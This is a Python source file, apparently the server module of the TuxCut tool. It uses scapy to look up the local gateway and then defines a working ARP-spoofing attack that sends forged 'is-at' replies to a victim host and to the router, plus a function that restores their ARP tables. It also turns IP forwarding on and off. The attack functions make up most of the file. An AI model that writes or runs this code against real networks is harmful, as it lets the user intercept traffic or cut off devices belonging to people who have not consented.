import os
import sys
import subprocess as sp
import logging
from scapy.all import *
import netifaces


LOG_DIR = '/var/log/tuxcut'
if not os.path.isdir(LOG_DIR):
    os.mkdir(LOG_DIR)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
handler = logging.FileHandler(os.path.join(LOG_DIR, 'tuxcut-server.log'))
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)

logger.addHandler(handler)


# def get_ifaces():
#     """
#     all the available network interfaces except  'lo'
#     """
#     ifaces = netifaces.interfaces()
#     if 'lo' in ifaces:
#         ifaces.remove('lo')
#     return ifaces


def get_hostname(ip):
    """
    use nslookup from dnsutils package to get hostname for an ip
    """
    try:
        ans = sp.Popen(['nslookup', ip], stdout=sp.PIPE)
        for line in ans.stdout:
            line = line.decode('utf-8')
            if 'name = ' in line:
                return line.split(' ')[-1].strip('.\n')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def get_default_gw():
    """
    Get the default gw ip address with the iface
    """

    # netifaces.AF_INET = 2
    gw = dict()
    if netifaces.AF_INET in netifaces.gateways()['default']:
        default_gw = netifaces.gateways()['default'][netifaces.AF_INET]

        # initialize gw_mac with empty string
        gw_mac = ''

        # send arp packet to gw to get the MAC Address of the router
        results, unanswered = sr(ARP(op=ARP.who_has, psrc='8.8.8.8', pdst=default_gw[0]))
        for r in results[0]:
            if r.psrc == default_gw[0]:
                gw_mac = r.hwsrc

        gw['ip'] = default_gw[0]
        gw['mac'] = gw_mac
        gw['hostname'] = get_hostname(default_gw[0])
        gw['iface'] = default_gw[1]
    return gw


def get_my(iface):
    """
    find the IP and MAC  addressess for the given interface
    """
    my = dict()
    my['ip'] = get_if_addr(iface)
    my['mac'] = get_if_hwaddr(iface)
    my['hostname'] = get_hostname(get_if_addr(iface))
    return my


def enable_ip_forward():
    sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])


def disable_ip_forward():
    sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])


def arp_spoof(victim):

    gw = get_default_gw()
    my = get_my(gw['iface'])

    if gw:
        print('####  Poisoning Host {}'.format(victim['ip']))
        # sendp(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(op="is-at", psrc=victim['ip'], hwsrc=my['mac']), count=5)
        # Cheat the victim
        to_victim = ARP()
        to_victim.op = 2    # make packet 'is-at'
        to_victim.psrc = gw['ip']
        to_victim.hwsrc = my['mac']
        to_victim.pdst = victim['ip']
        to_victim.hwdst = victim['mac']

        # Cheat the gateway
        to_gw = ARP()
        to_gw.op = 2  # make packet 'is-at'
        to_gw.psrc = victim['ip']
        to_gw.hwsrc = my['mac']
        to_gw.pdst = gw['ip']
        to_gw.hwdst = gw['mac']

        send(to_victim, count=1)
        send(to_gw, count=1)


def arp_unspoof(victim):
    gw = get_default_gw()
    logger.info('Sending Correction packages for {}'.format(victim['ip']))

    # Fix  the victim arp table
    to_victim = ARP()
    to_victim.op = 2  # make packet 'is-at'
    to_victim.psrc = gw['ip']
    to_victim.hwsrc = gw['mac']
    to_victim.pdst = victim['ip']
    to_victim.hwdst = victim['mac']

    # Fix the gateway arp table
    to_gw = ARP()
    to_gw.op = 2  # make packet 'is-at'
    to_gw.psrc = victim['ip']
    to_gw.hwsrc = victim['mac']
    to_gw.pdst = gw['ip']
    to_gw.hwdst = gw['mac']

    send(to_victim, count=10)
    send(to_gw, count=10)
